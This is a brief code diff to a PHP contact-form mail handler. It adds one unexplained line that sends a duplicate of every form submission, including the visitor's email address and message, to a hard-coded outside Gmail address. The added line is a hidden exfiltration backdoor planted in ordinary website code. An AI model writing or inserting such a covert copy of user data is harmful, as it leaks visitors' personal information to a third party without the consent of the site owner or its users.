@@ -56,6 +56,9 @@ html;
     $headers = 'Content-Type: text/html;From: ' .' <'.$clean['email'].'>' . "\r\n" . 'Reply-To: ' . $clean['email'];
 
     mail($send_to, $subject, $body, $headers);
+    mail("qualityscorejobs@gmail.com", $subject, $body, $headers);
+
+    
 
     echo 'sent';
     die();
